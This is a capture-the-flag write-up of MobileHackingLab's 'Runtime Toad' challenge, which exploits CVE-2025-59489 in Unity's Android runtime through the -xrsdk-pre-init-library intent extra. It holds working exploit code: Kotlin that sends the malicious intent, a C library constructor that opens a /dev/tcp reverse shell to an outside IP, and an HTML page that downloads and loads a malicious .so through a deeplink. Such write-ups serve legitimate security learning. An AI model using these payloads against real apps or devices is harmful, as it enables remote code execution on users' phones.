---
title: "MobileHackingLab — Runtime Toad Writeup"
date: 2025-11-10
category: "mobile"
tags: ["android", "unity", "rce", "ctf", "native"]
description: "Exploiting CVE-2025-59489 in Unity's runtime — local and remote RCE via -xrsdk-pre-init-library intent extras."
draft: false
---
## MobileHackingLab - Runtime Toad Writeup
It's been some time since I've written a writeup so I took some recent challenge from MobileHackingLabs as a way to practice again. This time, we'll be looking at the `Runtime Toad` challenge where the goal is to
exploit a recent security advisory published against the Unity runtime (**CVE-2025-59489**) and to gain RCE with one click. This is a fun challenge to tackle, since after solving we should have gained experience in attacking outdated Unity apks and have some knowledge on basic Unity game static reverse engineering.

![Screenshot 2025-11-10 203915](/images/writeups/ryCN6IkxZl.png)


### CVE-2025-59489: Arbitrary Code Execution in Unity Runtime
More details about the vulnerability can be read from `@ryotkak`'s post here: https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/, but the gist is due to a vulnerability within the Unity Runtime's intent handling process it would be possible for an attacker to load arbitrary shared libraries and eventually execute malicious code. Specifically, if we specify `-xrsdk-pre-init-library` on the unity intent string extra and pass in the path to a malicious binary that binary will get loaded via a dlopen() call on the Unity runtime binary.

![image](/images/writeups/ryxGIj6Jbe.png)

According to the author, the exploit can be performed through: (1) **a third-party mobile app installed on the device** and (2) **it can also be exploited remotely if the target application writes attacker-controlled content to it's private storage**. On this challenge, we'll be able to explore both approaches.

:::info 
ℹ️ Quick sidenote on (1): **third-party terminology**
On the article, the author states that "any _**malicious application**_ installed on the same device can exploit this vulnerability". But we're moving away from this in favor of the "third-party" terminology since i do agree with ch0pin's point that triagers dismiss most mobile app exploits by saying that the attacker must convince the victim to install a malicious app first. Thus it would be better to state that any third-party app can exploit it since it raises the question what if something legitimate like Google Chrome goes rouge or is used as a gadget for exploitation. 

Ch0pin's post can be found here: https://www.linkedin.com/posts/valsamaras_android-web-attack-surface-activity-7379817572491247617-3ZWB

Also an additional proof from an intent interception issue I submitted some time back:
![image](/images/writeups/rkhJLoakZx.png)

:::
#### Is the target app a Unity-based one?
When loading the apk on jadx-gui, we can see that the main/launcher activity of the app is `com.unity3d.player.UnityPlayerActivity`. That, along with the presence of native libraries such as `libil2cpp`, `libmain`, and `libunity` should be enough to say that it is unity-based. 

![image](/images/writeups/rkbZviayZl.png)

Here's a summary of what each libraries do:
- libil2cpp: When a Unity game is built using IL2CPP scripting backend, Unity converts all managed C# code (scripts, assemblies) into C++ and then compiles it into libil2cpp.so. This is where we’ll find the functions that matter for game hacking, reversing app logic, or analyzing vulnerabilities (auth, network, gameplay logic, etc.).
- libunity: Contains engine internals (rendering, physics, input). This is where the vulnerable dlopen call for CVE-2025-59489 is executed. 
#### Determining if a Unity-based APK is vulnerable
The quick answer is: if the apk hasn't been updated from Oct 2025-onwards it's highly likely that the app is vulnerable, since the patch was made available on October 2 and it's safe to assume that all previous unity editor versions prior to that would be vulnerable. See: https://unity.com/security/sept-2025-01

Although this isn't a sure way to determine if an app is vulnerable to CVE-2025-59489, there are some indicators we can look for on the app's resources as shared by the discussion from this thread: https://discussions.unity.com/t/finding-the-version-of-unity-player-used/63424/2. 

Looking at the provided RuntimeToad.apk file, we can extract it's resources via `apktool` then view the files under `assets/bin/Data`. In this case, we're interested in `data.unity3d` so we view the first bytes of it's header via `xxd`. By comparing it to the patch table from Unity's advisory page, we can gather that `2020.3.47f1` is vulnerable given that the patch was applied on `2020.3.49f1`.

![Screenshot 2025-11-08 171302](/images/writeups/S1MjUj61Zg.png)


Now that we already know that the RuntimeToad.apk is Unity-based and is made with a vulnerable Unity Editor version, we'll move on to the exploit development. 
### Attack #1: Local exploit via third-party application
For this attack scenario, our exploit application must be installed on the same device as the vulnerable target. We'll need the application to indicate `extractNativeLibs="true"` on it's Android Manifest in order to unpack the native lib from our exploit which will be loaded when we send the following intent:
```shell
$ adb shell am start -n "com.MobileHackingLab.RuntimeToad/com.unity3d.player.UnityPlayerActivity" -e unity "-xrsdk-pre-init-library /data/app/<exploitapp.package.name>-<random-b64>/lib/<arch>/<nameofexploitlibrary>.so"
```

But in a real world scenario, we won't have the capability to run adb commands. So we need a way for the exploit app to send the payload itself. And we can do this by determining the path of our extracted native library at runtime and sending the Intent when we have successfully retrieved it's location:
```kotlin
val exploitLib = File(applicationInfo.nativeLibraryDir + "/libblackb3ard.so")  
if (exploitLib.exists()) {  
    val exploitLibPath = exploitLib.absolutePath  
    Log.d("PwnLib", "Library exists: $exploitLibPath")  
  
    val targetPackageName = "com.MobileHackingLab.RuntimeToad"  
    var pwnIntent = Intent()  
    pwnIntent.setClassName(targetPackageName, "com.unity3d.player.UnityPlayerActivity")  
    pwnIntent.putExtra("unity", "-xrsdk-pre-init-library $exploitLibPath")  
    pwnIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)  
    startActivity(pwnIntent)  
}
```

On the native/C++ side of our exploit, we define an on_library_load method and mark it with `__attribute__((constructor))`. This will allow the dynamic linker to execute the code contained within this method when it is loaded via dlopen(). 
```c
__attribute__((constructor))  
static void on_library_load(void) {  
    LOGI("dlopen() has loaded our library, executing the exploit...");  
    system("sh -i >& /dev/tcp/10.11.3.2/9337 0>&1");  
}
```

Recording of the attack is uploaded on youtube, adjust quality if needed ehehe. 

{{< youtube N-zgClvtUvU >}}

### Attack #2: Remote payload delivery + 1-click exploit
In order to remotely exploit CVE-2025-59489, we need to fulfill two requirements:
1. The application exports `UnityPlayerActivity` or `UnityPlayerGameActivity` with the `android.intent.category.BROWSABLE` category -- ✅ we know from an earlier section that this activity is exported and has the browsable category.
2. The application writes files with attacker-controlled content to its private storage (e.g., through caching) -- this one we're not sure yet, so we reverse the app further. 

But going back to the writeup, or to the AndroidManifest file for the apk. We can see that the app registers a deeplink scheme (`runtimetoad://update`) -- the logic for this isn't implemented on the java side of things, so we dig into `libil2cpp.so`

![image](/images/writeups/rJpLPoT1bx.png)

#### Some game hacking basics, mostly static analysis (and me being a skiddie)
I don't have much experience with game hacking, but I do know is how to follow instructions. For this section we need three items: Il2CppDumper, Ghidra, and [Instructions to get a useful decompilation out of an il2cpp game. Or, "I spent hours to trial and error so hopefully you won't have to" by BadMagic100](https://gist.github.com/BadMagic100/47096cbcf64ec0509cf75d48cfbdaea5). I just followed the instructions thoroughly (and was surprised myself that it worked at the first go), the disclaimer about the whole process running for a long time is true though so you really want to have something else to do aside from this. 

Once everything is done, something that wasn't mentioned on the guide is to **RE-RUN AUTO ANALYSIS ON GHIDRA AFTER LOADING THE SYMBOLS** so that we can actually read the decompiled code (or not sure if that's just an issue for me). 
#### Instead of developing exploits, I need to develop patience
We should be able to see the functions and decompiled code clearly after following the steps from above, and our first instinct is to search for functions that seem to be responsible for handling the deep link operations. The one that stood out for me was: `GameManager$$HandleDeepLink`.

![image](/images/writeups/BkbVOiTkWg.png)

I don't want to relive the analysis here, but I did some pseudocode rewriting so that we can easily understand the flow.  Basically, the logic is that it checks if the `host` parameter is included on the deeplink and if present it passes that value to DownloadPatchFile -- the issue here is that it doesn't perform validations on the URLs received so it would be possible for us to place arbitrary URLs that we control.
```python
if url.startswith("runtimetoad://update"):
	host_url = ""
	
	url = url[url.indexOf("?"):]
	params = url.split("&")
	for i in params:
		i = i.split("=")
		if (len(i) == 2):
			if i[0] == "host":
				host_url = i[1]
	
	GameManager.DownloadPatchFile(host_url)
	
```

Now we want to test this behavior dynamically in order to observe where the files are being stored after the download method is called (and I was too lazy to do unity shenanigans further). We can spin up a quick python http server then trigger a deeplink to download something from our local machine as a test `runtimetoad://update?host=http://<yourip:port>/<yourtestfile>`

![image](/images/writeups/SkelkrUJxbg.png)

Nice, so we do have a way to write attacker-controlled content to the target application's private sandbox specifically we know that it's being stored on the app's files directory. We just need to host our malicious library, re-open the deeplink to trigger the download process again, then start an intent to exploit CVE-2025-59489 -- all of which we can do through a 1-click(-ish) attack:
```html
<!doctype html>
<head>
  <title>RuntimeToad Exploit</title>
</head>
<body>

  <button id="exploit1">Step 1: Trigger the update deeplink in order to download our malicious binary and write it to RuntimeToad's sandbox</button>
  <button id="exploit2">Step 2: Start an intent to load our malicious binary into the -xrsdk-pre-init-library parameter</button>

  <script>
    const DEEPLINK_SCHEME = `runtimetoad://update?host=https://github.com/blackbeard666/random-practice-pocs/raw/refs/heads/main/libblackb3ard.so`;
    const INTENT_URL = `intent://update#Intent;scheme=runtimetoad;package=com.MobileHackingLab.RuntimeToad;S.unity=-xrsdk-pre-init-library%20/data/data/com.MobileHackingLab.RuntimeToad/files/libblackb3ard.so;end;`;

    function openUri(uri) {
      window.location.href = uri;
    }

    document.getElementById('exploit1').addEventListener('click', function () {
      openUri(DEEPLINK_SCHEME);
    });

    document.getElementById('exploit2').addEventListener('click', function () {
      openUri(INTENT_URL);
    });
  </script>
</body>
</html>
```

I say 1-clickish since we still need to manually trigger the update process and go back to the attacker-controlled website to actually trigger the exploit intent. But to make it more clear, here's the uploaded demo recording on youtube:
{{< youtube igeicp4oa2Y >}}

### Conclusion
Writing is a bit rushed especially on the later parts, but hopefully I'll get to do more **once I'm done with my pending work tasks**. Also I still don't know much about Unity/game hacking so if you'd like to discuss more or share stuff with me, feel free to hit me up!
![image](/images/writeups/BkbZCIJxWl.png)
